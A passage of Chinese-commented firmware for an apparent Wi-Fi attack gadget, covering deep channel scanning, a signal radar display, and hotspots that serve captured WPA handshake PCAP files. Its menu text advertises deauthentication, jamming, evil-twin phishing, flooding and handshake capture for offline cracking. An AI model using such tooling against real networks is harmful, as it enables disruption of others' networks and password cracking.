      if (uniqueSSIDs.find(result.ssid) == uniqueSSIDs.end()) {
        uniqueSSIDs.insert(result.ssid);
        allResults.push_back(result);
      }
    }
  }
}

// 按信道逐个扫描 (2.4G + 5G)
void performChannelWiseScan(std::vector<WiFiScanResult>& allResults,
                             std::set<String>& uniqueSSIDs) {
  int channels[] = {
    // 2.4G 常用信道优先
    1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 14, 5, 10,
    // 5G UNII-1 (5.18-5.24 GHz)
    36, 40, 44, 48,
    // 5G UNII-2A (5.26-5.32 GHz)
    52, 56, 60, 64,
    // 5G UNII-2C (5.5-5.7 GHz)
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
    // 5G UNII-3 (5.745-5.825 GHz)
    149, 153, 157, 161, 165
  };
  int numCh = sizeof(channels) / sizeof(channels[0]);

  for (int i = 0; i < numCh; i++) {
    int ch = channels[i];
    String label = "信道" + String(ch);
    drawDeepScanDisplay(label.c_str());

    wext_set_channel(WLAN0_NAME, ch);
    delay(150);

    int scanTime;
    if (ch == 1 || ch == 6 || ch == 11)      scanTime = 3000;
    else if (ch >= 36 && ch <= 64)            scanTime = 2500;
    else if (ch >= 100 && ch <= 165)          scanTime = 2500;
    else                                       scanTime = 2000;

    performSingleScan(label.c_str(), scanTime, allResults, uniqueSSIDs);
    delay(300);
  }
}

// 隐藏网络扫描
void performHiddenNetworkScan(std::vector<WiFiScanResult>& allResults,
                               std::set<String>& uniqueSSIDs) {
  int hiddenCh[] = {
    1, 6, 11, 2, 7, 12,
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
    149, 153, 157, 161, 165
  };
  int numCh = sizeof(hiddenCh) / sizeof(hiddenCh[0]);

  for (int i = 0; i < numCh; i++) {
    int ch = hiddenCh[i];
    String label = "隐藏" + String(ch);
    drawDeepScanDisplay(label.c_str());

    wext_set_channel(WLAN0_NAME, ch);
    delay(200);

    int scanTime = (ch >= 36) ? 2500 : 3000;
    performSingleScan(label.c_str(), scanTime, allResults, uniqueSSIDs);
    delay(300);
  }
}

// 高级深度扫描：3种策略遍历
void performAdvancedDeepScan() {
  Serial.println("=== 开始WiFi网络深度扫描 ===");

  scan_results.clear();
  g_scanDone = false;

  std::set<String> uniqueSSIDs;
  std::vector<WiFiScanResult> allResults;

  // 策略1: 标准扫描
  Serial.println("=== 策略1: 标准扫描 ===");
  drawDeepScanProgress(1, 3, "标准扫描");
  performSingleScan("标准扫描", 4000, allResults, uniqueSSIDs);

  // 策略2: 多频段逐个信道扫描
  Serial.println("=== 策略2: 多频段扫描 ===");
  drawDeepScanProgress(2, 3, "多频段扫描");
  performChannelWiseScan(allResults, uniqueSSIDs);

  // 策略3: 隐藏网络长时间扫描
  Serial.println("=== 策略3: 隐藏网络扫描 ===");
  drawDeepScanProgress(3, 3, "隐藏网络扫描");
  performHiddenNetworkScan(allResults, uniqueSSIDs);

  // 合并结果
  scan_results = allResults;

  // 按信号强度排序 (强信号在前) —— 冒泡排序
  size_t n = scan_results.size();
  for (size_t i = 0; i < n; i++) {
    for (size_t j = i + 1; j < n; j++) {
      if (scan_results[j].rssi > scan_results[i].rssi) {
        WiFiScanResult tmp = scan_results[i];
        scan_results[i] = scan_results[j];
        scan_results[j] = tmp;
      }
    }
  }

  // 过滤 RSSI < -90dBm 的弱信号
  std::vector<WiFiScanResult> filtered;
  for (size_t i = 0; i < n; i++) {
    if (scan_results[i].rssi >= -90) {
      filtered.push_back(scan_results[i]);
    }
  }
  scan_results = filtered;

  // 限制最多100个
  if (scan_results.size() > 100) {
    scan_results.resize(100);
  }

  selectedFlags.assign(scan_results.size(), 0);
  wifiScrollOffset = 0;
  wifiCursorIndex = -1;

  Serial.println("深度扫描完成! 发现 " + String(scan_results.size()) + " 个网络");

  // 在屏幕上显示结果统计
  tft.fillScreen(COLOR_BG);
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, 0x07E0);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x07E0);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("扫描完成");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("扫描完成");

  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  String info = "发现: " + String(scan_results.size()) + " 个网络";
  int iw = u8g2_for_adafruit_gfx.getUTF8Width(info.c_str());
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - iw) / 2, 120);
  u8g2_for_adafruit_gfx.print(info);

  delay(1500);
}

void homeActionDeepScan() {
  g_screen = SCREEN_ATTACK_RUNNING;
  g_attackStop = false;
  Serial.println("[深度扫描] 开始全信道探测...");
  performAdvancedDeepScan();
  // 扫描完成后自动进入WiFi列表
  g_screen = SCREEN_WIFI_LIST;
  drawWiFiListScreen();
}

// ==================== WiFi热点雷达可视化 ====================
static unsigned long g_lastRadarScan = 0;
#define RADAR_SCAN_INTERVAL 2500
#define RADAR_CX  120
#define RADAR_CY  165
#define RADAR_R   105

static void drawRadarUI() {
  tft.fillScreen(COLOR_BG);

  // 标题栏 - 绿色
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, 0x03E0);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x03E0);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("无线雷达");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("无线雷达");

  int cx = RADAR_CX, cy = RADAR_CY, r = RADAR_R;

  // 雷达底图 — 5个同心圆 (RSSI: -30/-45/-60/-75/-90 dBm)
  for (int ring = 1; ring <= 5; ring++) {
    int rr = r * ring / 5;
    uint16_t ringColor = (ring == 5) ? 0x3186 : 0x2104;
    tft.drawCircle(cx, cy, rr, ringColor);
    // RSSI 标签
    int dBM = -30 - (ring - 1) * 15;
    u8g2_for_adafruit_gfx.setFont(u8g2_font_5x7_tf);
    u8g2_for_adafruit_gfx.setForegroundColor(0x632C);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(cx + rr + 2, cy - 3);
    u8g2_for_adafruit_gfx.print(dBM);
  }

  // 十字标线
  tft.drawLine(cx - r, cy, cx + r, cy, 0x2104);
  tft.drawLine(cx, cy - r, cx, cy + r, 0x2104);
  // 45度X线
  int d45 = (int)(r * 0.707f);
  tft.drawLine(cx - d45, cy - d45, cx + d45, cy + d45, 0x18E3);
  tft.drawLine(cx + d45, cy - d45, cx - d45, cy + d45, 0x18E3);

  // 绘制热点
  for (size_t i = 0; i < scan_results.size(); i++) {
    const WiFiScanResult& ap = scan_results[i];

    // 角度: BSSID[5] (最后一字节MAC) → 0~359度, 保证同AP位置稳定
    float angleDeg = ap.bssid[5] * 360.0f / 256.0f;
    float rad = angleDeg * PI / 180.0f;

    // 距离: RSSI映射 → 信号越强越靠圆心
    int clampedRSSI = constrain(ap.rssi, -95, -25);
    int dist = map(clampedRSSI, -95, -25, r - 4, 8);

    int px = cx + (int)(dist * sinf(rad));
    int py = cy - (int)(dist * cosf(rad));  // TFT Y轴向下, 数学Y向上

    // 颜色: 按信号强度
    uint16_t dotColor;
    if      (ap.rssi >= -40)  dotColor = 0x07E0;  // 绿
    else if (ap.rssi >= -55)  dotColor = 0xFFE0;  // 黄
    else if (ap.rssi >= -70)  dotColor = 0xFD20;  // 橙
    else                       dotColor = 0xF800;  // 红

    // 高亮圆点 (外圈半透明+实心)
    tft.drawCircle(px, py, 4, dotColor);
    tft.fillCircle(px, py, 3, dotColor);

    // 强信号 AP 显示短SSID
    if (ap.rssi >= -60 && ap.ssid.length() > 0) {
      String label = ap.ssid.length() > 6 ? utf8SafeTruncate(ap.ssid, 5) + "~" : ap.ssid;
      u8g2_for_adafruit_gfx.setFont(u8g2_font_5x7_tf);
      u8g2_for_adafruit_gfx.setForegroundColor(dotColor);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
      u8g2_for_adafruit_gfx.setCursor(px + 5, py - 3);
      u8g2_for_adafruit_gfx.print(label);
    }
  }

  // 中心点 (本机)
  tft.fillCircle(cx, cy, 5, COLOR_WHITE);
  tft.drawCircle(cx, cy, 7, 0x8410);
  tft.fillCircle(cx, cy, 2, 0x0000);

  // 底部统计栏
  int strongest = -999;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].rssi > strongest) strongest = scan_results[i].rssi;
  }
  tft.drawLine(0, BTN_BAR_Y - 2, SCREEN_WIDTH, BTN_BAR_Y - 2, 0x18E7);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setCursor(8, BTN_BAR_Y - 8);
  u8g2_for_adafruit_gfx.print("AP:" + String(scan_results.size()));
  u8g2_for_adafruit_gfx.setCursor(100, BTN_BAR_Y - 8);
  u8g2_for_adafruit_gfx.print("MAX:" + (strongest > -999 ? String(strongest) + "dBm" : "--"));

  // 底部按钮
  tft.fillRect(0, BTN_BAR_Y, SCREEN_WIDTH, BTN_BAR_H, COLOR_BG);
  drawButton(0,         BTN_BAR_Y + 2, BTN_W, BTN_H, 0x03E0,   "刷新", COLOR_WHITE);
  drawButton(BTN_W*3,   BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_BACK, "返回", COLOR_WHITE);

  drawAreaBorders();  // 底部按钮栏分区围绕线
}

// ==================== 无线雷达内容刷新（保留标题和按钮，不重绘避免闪烁）====================
static void redrawRadarContent() {
  // 只清除雷达内容区（标题栏之下、按钮栏之上）
  tft.fillRect(0, 40, SCREEN_WIDTH, BTN_BAR_Y - 2 - 40, COLOR_BG);

  int cx = RADAR_CX, cy = RADAR_CY, r = RADAR_R;

  // 雷达底图 — 5个同心圆
  for (int ring = 1; ring <= 5; ring++) {
    int rr = r * ring / 5;
    uint16_t ringColor = (ring == 5) ? 0x3186 : 0x2104;
    tft.drawCircle(cx, cy, rr, ringColor);
    int dBM = -30 - (ring - 1) * 15;
    u8g2_for_adafruit_gfx.setFont(u8g2_font_5x7_tf);
    u8g2_for_adafruit_gfx.setForegroundColor(0x632C);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(cx + rr + 2, cy - 3);
    u8g2_for_adafruit_gfx.print(dBM);
  }

  // 十字标线
  tft.drawLine(cx - r, cy, cx + r, cy, 0x2104);
  tft.drawLine(cx, cy - r, cx, cy + r, 0x2104);
  int d45 = (int)(r * 0.707f);
  tft.drawLine(cx - d45, cy - d45, cx + d45, cy + d45, 0x18E3);
  tft.drawLine(cx + d45, cy - d45, cx - d45, cy + d45, 0x18E3);

  // 绘制热点
  for (size_t i = 0; i < scan_results.size(); i++) {
    const WiFiScanResult& ap = scan_results[i];
    float angleDeg = ap.bssid[5] * 360.0f / 256.0f;
    float rad = angleDeg * PI / 180.0f;
    int clampedRSSI = constrain(ap.rssi, -95, -25);
    int dist = map(clampedRSSI, -95, -25, r - 4, 8);
    int px = cx + (int)(dist * sinf(rad));
    int py = cy - (int)(dist * cosf(rad));

    uint16_t dotColor;
    if      (ap.rssi >= -40)  dotColor = 0x07E0;
    else if (ap.rssi >= -55)  dotColor = 0xFFE0;
    else if (ap.rssi >= -70)  dotColor = 0xFD20;
    else                       dotColor = 0xF800;

    tft.drawCircle(px, py, 4, dotColor);
    tft.fillCircle(px, py, 3, dotColor);

    if (ap.rssi >= -60 && ap.ssid.length() > 0) {
      String label = ap.ssid.length() > 6 ? utf8SafeTruncate(ap.ssid, 5) + "~" : ap.ssid;
      u8g2_for_adafruit_gfx.setFont(u8g2_font_5x7_tf);
      u8g2_for_adafruit_gfx.setForegroundColor(dotColor);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
      u8g2_for_adafruit_gfx.setCursor(px + 5, py - 3);
      u8g2_for_adafruit_gfx.print(label);
    }
  }

  // 中心点
  tft.fillCircle(cx, cy, 5, COLOR_WHITE);
  tft.drawCircle(cx, cy, 7, 0x8410);
  tft.fillCircle(cx, cy, 2, 0x0000);

  // 底部统计栏
  int strongest = -999;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].rssi > strongest) strongest = scan_results[i].rssi;
  }
  tft.drawLine(0, BTN_BAR_Y - 2, SCREEN_WIDTH, BTN_BAR_Y - 2, 0x18E7);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setCursor(8, BTN_BAR_Y - 8);
  u8g2_for_adafruit_gfx.print("AP:" + String(scan_results.size()));
  u8g2_for_adafruit_gfx.setCursor(100, BTN_BAR_Y - 8);
  u8g2_for_adafruit_gfx.print("MAX:" + (strongest > -999 ? String(strongest) + "dBm" : "--"));
}

static void homeActionRadar() {
  Serial.println("[雷达] 开始扫描WiFi热点...");
  scanNetworks(false);  // 扫描但不跳转列表屏
  g_screen = SCREEN_RADAR;
  g_lastRadarScan = millis();
  drawRadarUI();
  Serial.println("[雷达] WiFi热点雷达可视化已启动, AP数: " + String(scan_results.size()));
}

// ==================== 菜单功能入口 ====================
const char* menuDesc[] = {
  "快速扫描2.4GHz频段\n列出所有可见AP",
  "深度扫描全信道\n探测隐藏SSID",
  "浏览已扫描WiFi列表\n多选攻击目标",
  "打开攻击子菜单\n解认证/信标/组合攻击",
  "干扰指定信道通信\n阻塞数据帧",
  "创建同名钓鱼热点\n诱骗目标连接",
  "广播伪造黑洞路由\n扰乱网络拓扑",
  "大规模洪水分组攻击\n耗尽目标资源",
  "抓取WPA/WPA2握手包\n用于离线破解",
  "可视化WiFi热点雷达\nRSSI距离/信道方向",
  "实时显示无线帧\n分析网络流量",
  "检测周边攻击行为\n识别恶意设备",
  "校屏触摸偏移量\n提升触控精度",
  "系统参数配置\n亮度/关于/信息",
  "启动Web管理后台\n手机/PC浏览器配置"
};

// ==================== Web配置热点 ====================

// 停止Web配置热点
// ==================== 绘制Web配置状态界面 ====================
// 用于从熄屏唤醒等场景重新绘制Web配置运行中的界面
static void drawWebConfigStatusUI() {
  tft.fillScreen(COLOR_BG);
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, 0x07E0);  // 绿色标题
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x07E0);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("Web配置已启动");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("Web配置已启动");

  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setCursor(20, 70);
  u8g2_for_adafruit_gfx.print("SSID: " WEB_UI_SSID);
  u8g2_for_adafruit_gfx.setCursor(20, 100);
  u8g2_for_adafruit_gfx.print("密码: " WEB_UI_PASSWORD);
  u8g2_for_adafruit_gfx.setCursor(20, 130);
  u8g2_for_adafruit_gfx.print("地址: 192.168.1.1");
  u8g2_for_adafruit_gfx.setCursor(20, 170);
  u8g2_for_adafruit_gfx.print("后台驻留运行中...");

  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setCursor(20, 210);
  u8g2_for_adafruit_gfx.print("手机/PC连接此热点");
  u8g2_for_adafruit_gfx.setCursor(20, 235);
  u8g2_for_adafruit_gfx.print("浏览器打开 192.168.1.1");

  u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
  u8g2_for_adafruit_gfx.setCursor(20, 275);
  u8g2_for_adafruit_gfx.print("点击[停止]关闭热点");

  // 底部停止按钮（居中，占两个按钮宽度）
  tft.drawLine(0, BTN_BAR_Y - 2, SCREEN_WIDTH, BTN_BAR_Y - 2, 0x18E7);
  tft.fillRect(0, BTN_BAR_Y, SCREEN_WIDTH, BTN_BAR_H, COLOR_BG);
  drawButton(BTN_W, BTN_BAR_Y + 2, BTN_W * 2, BTN_H, 0xF800, "停止热点", COLOR_WHITE);
  drawAreaBorders();
}

static void stopWebConfig() {
  if (!g_webConfigRunning && !g_webConfigApUp) return;
  
  Serial.println("[WebConfig] 正在停止Web配置热点...");
  
  g_webConfigServer.stop();
  g_webConfigDnsServer.stop();
  delay(300);
  
  // 断开AP模式
  WiFi.disconnect();
  
  g_webConfigRunning = false;
  g_webConfigApUp    = false;
  g_attackRunningType = -1;
  
  Serial.println("[WebConfig] Web配置热点已停止");
  
  // 返回主菜单
  g_screen = SCREEN_MAIN;
  currentSelection = 14;  // 保持Web配置项选中
  g_pendingMenuDraw = true;
}

// ==================== 抓包下载热点 (BW16-WebTest) ====================

// 绘制下载热点状态界面
static void drawDownloadApUI() {
  tft.fillScreen(COLOR_BG);
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, 0x07E0);  // 绿色标题
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x07E0);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("抓包完成-下载热点");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("抓包完成-下载热点");

  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setCursor(20, 65);
  u8g2_for_adafruit_gfx.print("SSID: " WEB_TEST_SSID " (开放式)");
  u8g2_for_adafruit_gfx.setCursor(20, 95);
  u8g2_for_adafruit_gfx.print("信道: CH" + String(WEB_TEST_CHANNEL));
  u8g2_for_adafruit_gfx.setCursor(20, 125);
  u8g2_for_adafruit_gfx.print("地址: 192.168.4.1");
  u8g2_for_adafruit_gfx.setCursor(20, 155);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.print("PCAP大小: " + String(globalPcapData.size()) + " bytes");

  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setCursor(20, 185);
  u8g2_for_adafruit_gfx.print("握手帧: " + String(lastCaptureHSCount) + "/4");
  u8g2_for_adafruit_gfx.print("  管理帧: " + String(lastCaptureMgmtCount));

  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setCursor(20, 220);
  u8g2_for_adafruit_gfx.print("手机/PC连接此热点");

  u8g2_for_adafruit_gfx.setCursor(20, 245);
  u8g2_for_adafruit_gfx.print("点击下载 PCAP 文件");

  u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
  u8g2_for_adafruit_gfx.setCursor(20, 265);
  u8g2_for_adafruit_gfx.print("点击[停止]关闭热点");
}

static void downloadHandleWeb() {
  if (!g_downloadApRunning) return;

  WiFiClient client = g_downloadServer.available();
  if (!client) return;

  String line = "", req = "";
  bool reqLineRead = false;
  unsigned long timeout = millis() + 300;
  while (client.connected() && millis() < timeout) {
    if (client.available()) {
      char c = client.read();
      timeout = millis() + 300;
      line += c;
      if (c == '\n') {
        if (!reqLineRead && line.startsWith("GET ") || line.startsWith("POST ")) {
          req = line;
          reqLineRead = true;
        }
        if (line == "\r\n" || line == "\n") break;
        line = "";
      }
    }
  }

  // 读取完剩余请求头
  while (client.available()) client.read();

  // 路由分发
  if (req.startsWith("GET /download ") || req.startsWith("GET /handshake/download ")) {
    // 返回 PCAP 文件
    if (globalPcapData.empty()) {
      client.println("HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nNo handshake data");
    } else {
      client.print("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n");
      client.print("Content-Disposition: attachment; filename=\"capture.pcap\"\r\n");
      client.print("Content-Length: " + String(globalPcapData.size()) + "\r\n");
      client.print("Connection: close\r\n\r\n");
      client.write(globalPcapData.data(), globalPcapData.size());
      Serial.println("[DownloadAP] PCAP文件已发送 (" + String(globalPcapData.size()) + " bytes)");
    }
  } else if (req.startsWith("GET / ") || req.indexOf("GET / ") == 0) {
    // 首页 — 简单下载页面
    String html = F("<!DOCTYPE html><html lang=\"zh\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>下载握手包</title>"
      "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}"
      ".card{background:#1a1a2e;border-radius:12px;padding:30px;text-align:center;max-width:360px;width:90%}"
      "h2{color:#07E0;margin-bottom:10px}.info{color:#aaa;font-size:14px;margin:8px 0}"
      ".btn{display:inline-block;margin-top:20px;padding:14px 40px;background:#07E0;color:#000;border:none;border-radius:8px;font-size:18px;text-decoration:none;cursor:pointer}"
      ".btn:active{opacity:0.8}.size{color:#FFE0;font-size:16px}</style></head><body>"
      "<div class=\"card\"><h2>握手包已就绪</h2>"
      "<p class=\"info\">目标: %TARGET%</p>"
      "<p class=\"size\">文件大小: %SIZE% bytes</p>"
      "<p class=\"info\">握手帧: %HS% | 管理帧: %MGMT%</p>"
      "<a class=\"btn\" href=\"/download\" download=\"capture.pcap\">下载 PCAP 文件</a></div></body></html>");

    html.replace("%TARGET%", _selectedNetwork.ssid);
    html.replace("%SIZE%", String(globalPcapData.size()));
    html.replace("%HS%", String(lastCaptureHSCount) + "/4");
    html.replace("%MGMT%", String(lastCaptureMgmtCount));

    client.print("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n");
    client.print("Content-Length: " + String(html.length()) + "\r\nConnection: close\r\n\r\n");
    client.print(html);
  } else if (req.startsWith("GET /status ")) {
    client.println("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"ok\":true,\"pcapSize\":" + String(globalPcapData.size()) + "}");
  } else {
    client.println("HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nNot Found");
  }

  delay(5);
  client.stop();
}

// 停止下载热点
static void stopDownloadAp() {
  if (!g_downloadApRunning && !g_downloadApUp) return;

  Serial.println("[DownloadAP] 正在停止下载热点...");

  g_downloadServer.stop();
  g_downloadDnsServer.stop();
  delay(300);
  WiFi.disconnect();
  delay(300);

  g_downloadApRunning = false;
  g_downloadApUp      = false;
  g_attackRunningType = -1;

  Serial.println("[DownloadAP] 下载热点已停止");

  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// 启动下载热点 (BW16-WebTest, 开放式无密码)
static void startDownloadAp() {
  // 如果已在运行则先停止
  if (g_downloadApRunning || g_downloadApUp) {
    stopDownloadAp();
    delay(300);
  }
  // 如果Web配置热点在运行，也停止它（避免AP冲突）
  if (g_webConfigRunning || g_webConfigApUp) {
    stopWebConfig();
    delay(300);
  }

  Serial.println("[DownloadAP] 正在启动下载热点...");

  tft.fillScreen(COLOR_BG);
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_TITLE_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("启动下载热点");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("启动下载热点");
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setCursor(20, 120);
  u8g2_for_adafruit_gfx.print("正在创建开放式热点...");

  // 停旧服务
  g_downloadServer.stop();
  g_downloadDnsServer.stop();
  delay(300);

  // 启用并发模式
  WiFi.enableConcurrent();

  // 配置静态IP
  WiFi.config(IPAddress(192,168,4,1), IPAddress(192,168,4,1),
              IPAddress(192,168,4,1), IPAddress(255,255,255,0));

  // DNS强制门户
  g_downloadDnsServer.setResolvedIP(192,168,4,1);
  g_downloadDnsServer.begin();

  // 创建开放式AP (无密码)
  char ssidBuf[33], chBuf[4];
  snprintf(ssidBuf, sizeof(ssidBuf), "%s", WEB_TEST_SSID);
  snprintf(chBuf, sizeof(chBuf), "%d", WEB_TEST_CHANNEL);

  int apRetry = 0, apResult = 0;
  while (apRetry < 10) {
    apResult = WiFi.apbegin(ssidBuf, chBuf, (uint8_t)0);  // 无密码=开放式AP, hidden_ssid=0可见
    if (apResult == WL_CONNECTED) break;
    apRetry++; delay(800);
  }

  if (apResult != WL_CONNECTED) {
    Serial.println("[DownloadAP] AP启动失败!");
    g_downloadDnsServer.stop();
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(20, 150);
    u8g2_for_adafruit_gfx.print("热点创建失败!");
    delay(2000);
    g_downloadApRunning = false;
    g_downloadApUp      = false;
    g_screen = SCREEN_MAIN;
    currentSelection = 1;
    g_pendingMenuDraw = true;
    return;
  }

  WiFi.config(IPAddress(192,168,4,1), IPAddress(192,168,4,1),
              IPAddress(192,168,4,1), IPAddress(255,255,255,0));

  g_downloadServer.begin();
  g_downloadApRunning = true;
  g_downloadApUp      = true;
  g_attackRunningType = 15;  // DownloadAP

  IPAddress apIp = WiFi.localIP();
  Serial.print("[DownloadAP] 开放式AP已创建 SSID="); Serial.println(WEB_TEST_SSID);
  Serial.print("[DownloadAP] IP="); Serial.println(apIp);

  // 绘制状态界面并保持
  drawDownloadApUI();

  // 底部停止按钮
  tft.drawLine(0, BTN_BAR_Y - 2, SCREEN_WIDTH, BTN_BAR_Y - 2, 0x18E7);
  tft.fillRect(0, BTN_BAR_Y, SCREEN_WIDTH, BTN_BAR_H, COLOR_BG);
  drawButton(BTN_W, BTN_BAR_Y + 2, BTN_W * 2, BTN_H, 0xF800, "停止热点", COLOR_WHITE);
  drawAreaBorders();

  g_screen = SCREEN_DOWNLOAD_AP;
}

// 启动Web配置热点（后台运行，不阻塞主菜单）
static void startWebConfig() {
  // 如果已在运行，先停止再重启
  if (g_webConfigRunning || g_webConfigApUp) {
    stopWebConfig();
    delay(300);
  }
  
  Serial.println("[WebConfig] 正在启动Web配置热点...");
  
  // 显示启动状态
  tft.fillScreen(COLOR_BG);
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_TITLE_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("Web配置管理");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("Web配置管理");
  
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setCursor(20, 120);
  u8g2_for_adafruit_gfx.print("正在创建热点...");
  
  // 停止旧服务
  g_webConfigServer.stop();
  g_webConfigDnsServer.stop();
  delay(300);
  
  // 启用并发模式（STA+AP）
  WiFi.enableConcurrent();
  
  // 配置静态IP
  WiFi.config(IPAddress(192,168,1,1), IPAddress(192,168,1,1),
              IPAddress(192,168,1,1), IPAddress(255,255,255,0));
  
  // 在apbegin之前启动自定义DNS（抢占端口53）
  g_webConfigDnsServer.setResolvedIP(192,168,1,1);
  g_webConfigDnsServer.begin();
  
  // 创建安全AP（带密码）
  char ssidBuf[33], passBuf[65], chBuf[4];
  snprintf(ssidBuf, sizeof(ssidBuf), "%s", WEB_UI_SSID);
  snprintf(passBuf, sizeof(passBuf), "%s", WEB_UI_PASSWORD);
  snprintf(chBuf, sizeof(chBuf), "%d", WEB_UI_CHANNEL);
  
  int apRetry = 0, apResult = 0;
  while (apRetry < 10) {
    apResult = WiFi.apbegin(ssidBuf, passBuf, chBuf, (uint8_t)0);
    if (apResult == WL_CONNECTED) break;
    apRetry++; delay(800);
  }
  
  if (apResult != WL_CONNECTED) {
    Serial.println("[WebConfig] AP启动失败!");
    g_webConfigDnsServer.stop();
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(20, 150);
    u8g2_for_adafruit_gfx.print("热点创建失败!");
    delay(2000);
    g_webConfigRunning = false;
    g_webConfigApUp    = false;
    g_attackRunningType = -1;
    g_screen = SCREEN_MAIN;
    currentSelection = 1;
